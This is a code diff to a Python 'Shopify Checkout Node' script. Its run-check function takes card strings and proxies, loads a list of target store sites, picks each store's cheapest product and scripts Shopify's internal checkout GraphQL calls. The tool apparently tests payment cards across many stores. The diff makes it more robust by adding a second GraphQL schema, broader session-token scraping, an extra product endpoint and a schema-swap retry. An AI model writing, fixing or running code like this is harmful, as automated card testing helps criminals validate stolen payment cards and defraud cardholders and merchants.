@@ -1,6 +1,7 @@
 """
 app.py — Shopify Checkout Node (Render / scale plan)
 =====================================================
+Supports BOTH GraphQL schemas (lines & merchandiseLines).
 """
 
 import os
@@ -33,7 +34,6 @@ def _load_sites():
     if env_sites:
         parts = re.split(r"[\n,]+", env_sites)
         return [s.strip() for s in parts if s.strip() and s.strip().startswith("http")]
-
     here = os.path.dirname(os.path.abspath(__file__))
     for name in ("site.txt", "sites.txt"):
         p = os.path.join(here, name)
@@ -136,12 +136,16 @@ def _parse_proxy(s):
 # 🔍 EXTRACTIONS
 # ─────────────────────────────────────────────────────────────────────────────
 def _session_token(h):
-    for pat in (r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
-                r'"sessionToken"\s*:\s*"([^"]+)"'):
+    for pat in (
+        r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
+        r'"sessionToken"\s*:\s*"([^"]+)"',
+        r'"checkoutSessionToken"\s*:\s*"([^"]+)"',
+        r'checkout_session_token["\']?\s*:\s*["\']([^"\']+)[\"\']'
+    ):
         m = re.search(pat, h)
         if m:
             t = html.unescape(m.group(1)).strip('"\'')
-            if len(t) > 50: return t
+            if len(t) > 30: return t
     return ""
 
 def _commit_sha(h):
@@ -290,7 +294,8 @@ def _graphql_ids(session, shop_url, checkout_html, ua):
 def _cheapest_product(session, shop_url, ua, timeout=8):
     diag = []
     for ep in (f"{shop_url}/products.json?limit=250",
-               f"{shop_url}/collections/all/products.json?limit=250"):
+               f"{shop_url}/collections/all/products.json?limit=250",
+               f"{shop_url}/collections/frontpage/products.json?limit=250"):
         try:
             r = session.get(ep, headers={"user-agent": ua}, timeout=timeout)
             diag.append((ep.split(shop_url)[-1], r.status_code))
@@ -310,9 +315,9 @@ def _cheapest_product(session, shop_url, ua, timeout=8):
     return None, None, diag
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🛒 RESTORED PROPOSAL PAYLOAD
+# 🛒 PAYLOAD BUILDER (Supports BOTH `lines` and `merchandiseLines`)
 # ─────────────────────────────────────────────────────────────────────────────
-def _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, proposal_id):
+def _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, proposal_id, use_lines=False):
     if addr:
         sa   = _street_addr(addr["fn"], addr["ln"], addr)
         dest = {"partialStreetAddress": {"address1":sa["address1"],"city":sa["city"],
@@ -322,6 +327,8 @@ def _proposal_payload(session_token, stable_id, vid, amount, currency, email, ad
         dest = {"partialStreetAddress": {"address1":"","city":"","countryCode":"US",
                 "lastName":"","phone":"","oneTimeUse":False}}
         bill = {"streetAddress": {"address1":"","city":"","countryCode":"US","lastName":"","phone":""}}
+
+    merch_key = "lines" if use_lines else "merchandiseLines"
 
     return {
         "variables": {
@@ -349,7 +356,7 @@ def _proposal_payload(session_token, stable_id, vid, amount, currency, email, ad
                 "supportsSplitShipping":          True,
             },
             "deliveryExpectations": {"deliveryExpectationLines": []},
-            "merchandise": {"lines": [{
+            "merchandise": {merch_key: [{
                 "stableId": stable_id,
                 "merchandise": {"productVariantReference": {
                     "id":        f"gid://shopify/ProductVariantMerchandise/{vid}",
@@ -484,7 +491,7 @@ def _run_check(card_str, proxy_str):
 
         checkout_url  = r.url
         checkout_html = r.text
-        cart_token    = (re.search(r'/checkouts/cn/([^/?]+)', checkout_url) or [None, ""])[1]
+        cart_token    = (re.search(r'/checkouts/(?:cn/)?([^/?]+)', checkout_url) or [None, ""])[1]
 
         session_token = _session_token(checkout_html)
         commit_sha    = _commit_sha(checkout_html)
@@ -523,11 +530,21 @@ def _run_check(card_str, proxy_str):
             "x-checkout-web-build-id":      commit_sha,
         }
         prop_url = f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal"
+        
+        use_lines = False # Start with merchandiseLines (older schema)
 
         # ── 4a. Proposal 1 ────────────────────────────────────────────────
         try:
-            p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id)
+            p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines)
             r1 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
+            
+            # ═══ FIX: Schema Swap Retry ═══
+            if r1.status_code == 200 and "INVALID_VARIABLE" in r1.text:
+                if "merchandiseLines" in r1.text and "not defined" in r1.text:
+                    use_lines = True
+                    p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines)
+                    r1 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
+                    
         except Exception as e:
             return _fail("P1_EXC", shop=shop_url, err=str(e)[:100])
         if r1.status_code != 200:
@@ -540,7 +557,7 @@ def _run_check(card_str, proxy_str):
 
         # ── 4b. Proposal 2 ────────────────────────────────────────────────
         try:
-            p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, None, prop_id)
+            p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, None, prop_id, use_lines)
             p["variables"]["queueToken"] = queue_token
             r2 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
         except Exception as e:
@@ -550,7 +567,7 @@ def _run_check(card_str, proxy_str):
 
         # ── 4c. Proposal 3 ────────────────────────────────────────────────
         try:
-            p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id)
+            p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id, use_lines)
             p["variables"]["queueToken"] = queue_token
             r3 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
         except Exception as e:
@@ -575,7 +592,7 @@ def _run_check(card_str, proxy_str):
                 break
             time.sleep(0.05)
             try:
-                p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id)
+                p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id, use_lines)
                 p["variables"]["queueToken"] = queue_token
                 rN = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
                 if rN.status_code != 200: continue
@@ -615,6 +632,7 @@ def _run_check(card_str, proxy_str):
 
         sa        = _street_addr(fn, ln, addr_raw)
         price_str = f"{amount_f} {currency}"
+        merch_key = "lines" if use_lines else "merchandiseLines"
 
         def _build_submit(cur_tax, cur_total):
             return {
@@ -643,7 +661,7 @@ def _run_check(card_str, proxy_str):
                         "deliveryExpectations": {
                             "deliveryExpectationLines": [{"signedHandle": h} for h in signed],
                         },
-                        "merchandise": {"lines": [{
+                        "merchandise": {merch_key: [{
                             "stableId": stable_id,
                             "merchandise": {"productVariantReference": {
                                 "id":        f"gid://shopify/ProductVariantMerchandise/{vid}",
